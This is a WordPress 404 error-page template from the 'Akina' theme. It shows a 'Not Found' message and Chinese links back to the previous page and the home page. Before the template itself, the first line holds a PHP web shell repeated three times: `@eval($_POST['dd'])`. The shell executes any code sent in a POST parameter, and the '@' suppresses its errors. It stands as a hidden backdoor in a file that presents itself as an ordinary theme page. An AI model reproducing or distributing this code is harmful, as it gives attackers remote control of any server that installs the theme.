<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php
/**
 * The template for displaying 404 pages (not found).
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package Akina
 */

 ?>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title itemprop="name"><?php global $page, $paged;wp_title( '-', true, 'right' );
bloginfo( 'name' );$site_description = get_bloginfo( 'description', 'display' );
if ( $site_description && ( is_home() || is_front_page() ) ) echo " - $site_description";if ( $paged >= 2 || $page >= 2 ) echo ' - ' . sprintf( __( '第 %s 页'), max( $paged, $page ) );?>
</title>

     
<?php wp_head(); ?>
   <link href="//fonts.googleapis.com/css?family=Lato:100" rel="stylesheet" type="text/css">
        <style>
            html, body {
                height: 100%;
            }

            body {
                margin: 0;
                padding: 0;
                width: 100%;
                color: #B0BEC5;
                display: table;
                font-weight: 100;
                font-family: 'Lato', sans-serif;
            }

            .container {
                text-align: center;
                display: table-cell;
                vertical-align: middle;
            }

            .content {
                text-align: center;
                display: inline-block;
            }

            .title {
color:#797979;
                font-size: 72px;
                margin-bottom: 40px;
            }
        </style>
</head>
<body <?php body_class(); ?>>

<div class="container">
            <div class="content">
                <div class="title">404 Not Found.</div>
<div class="err-button back">
<a id="golast" href=javascript:history.go(-1);>返回上一页</a>
<a id="gohome" href="<?php bloginfo('url');?>">返回主页</a>  
</div>
        </div>

</div>

</body>


